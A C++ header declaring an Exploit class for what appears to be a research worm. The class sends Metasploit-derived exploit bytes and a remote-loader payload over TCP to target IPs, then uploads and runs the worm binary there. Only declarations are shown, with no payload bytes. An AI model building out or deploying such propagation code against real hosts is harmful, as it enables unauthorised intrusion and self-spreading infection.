/* 
 * File:   Exploit.hpp
 * Author: rbeede
 *
 * Created on March 21, 2012, 7:09 PM
 */

#ifndef EXPLOIT_HPP
#define	EXPLOIT_HPP


#include <string>
#include <fstream>

// FIXME might replace with Boost delay_timer
#ifdef _WIN32
#include <windows.h>
#define sleep(n) Sleep(1000 * n)
#else
#include <unistd.h>
#endif

#include <boost/lexical_cast.hpp>
#include <boost/filesystem/operations.hpp>

#include "logger.hpp"
extern Logger * logger;

#include "Configuration.hpp"
#include "TCPClient.hpp"


/**
 * You may assume that a global variable "logger" is available already
 * 
 * Some useful configuration data is made available as global variables care of Configuration
 */
class Exploit {
public:
	/**
	 * Required default constructor
	 * 
	 * It is easier to not pass arguments but instead read global variables care of Configuration.hpp
	*/
	Exploit();
	
	virtual ~Exploit();
	
	/**
	 * 
      * @param targetIP
      * @return true if target was successfully exploited, false otherwise.
      */
	bool exploit(const std::string & targetIP);
	
private:
	static const unsigned char exploitBytes[];  // exploit_metasploit_upexec.cpp
	static const int exploitBytes_length;
	static const unsigned char exploitPayloadBytes[];  // exploit_payload_thesiswormremoteloader.cpp
	static const int exploitPayloadBytes_length;
	
	static const std::string EXPLOIT_PORT;
	static const std::string PAYLOAD_PORT;
	static const std::string PAYLOAD_LOADER_PORT;
	
	/**
	 * Sends the given bytes via TCP to the target and closed the connection
	 * 
	 * Any errors are logged to "logger"
	 * 
	 * @return true if no errors.  false otherwise.
	 */
	bool sendToTarget(const std::string & ipAddress, const std::string & port, const unsigned char * const bytes, const int bytes_length);
	
	std::vector<unsigned char> createOptionsFileContent(const std::string & targetIPAddress, const std::string & port, const std::string & optionsFilename);
        
        std::vector<unsigned char> prepForSaveBinaryFile(const std::string & pathname, const std::string & destname);
        
        std::vector<unsigned char> createExecContent(const std::string & wormFilename, const std::string & optionsFilename, const std::string & updateFilename);
};

#endif	/* EXPLOIT_HPP */

